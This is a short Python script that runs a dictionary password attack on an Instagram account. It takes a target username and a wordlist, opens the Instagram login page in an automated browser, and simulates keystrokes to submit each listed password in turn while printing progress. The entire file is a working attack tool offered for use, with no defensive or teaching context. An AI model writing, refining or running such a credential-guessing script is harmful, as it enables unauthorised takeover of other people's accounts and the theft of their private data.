from webbot import Browser
from pynput.keyboard import Key, Controller
import time
from os import system, name

def clear():
    system('clear')

username = input('Username: ')
dictionary = input('Choose Dictionary: ')

clear()
file = open(f'{dictionary}.txt', 'r')
print("Wait...")
total = len(file.readlines())
file.close()
if(total > 0):
    print("READY", total)
currentLine = 0
pcent = 0
v = 0
file = open(f'{dictionary}.txt', 'r')
web = Browser()
keyboard = Controller()
web.go_to('www.instagram.com')
time.sleep(3)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(3)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(3)
web.type(username)
keyboard.press(Key.tab)
keyboard.release(Key.tab) 
for t in file:
    t = t.strip()
    web.type(t, into="Password")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    currentLine += 1
    v += 1
    pcent = (currentLine * 100) / total
    if(v == 500):
        v = 0
        clear()
        print("processing", pcent, "%")

file.close()
print("proccess Complete 100%")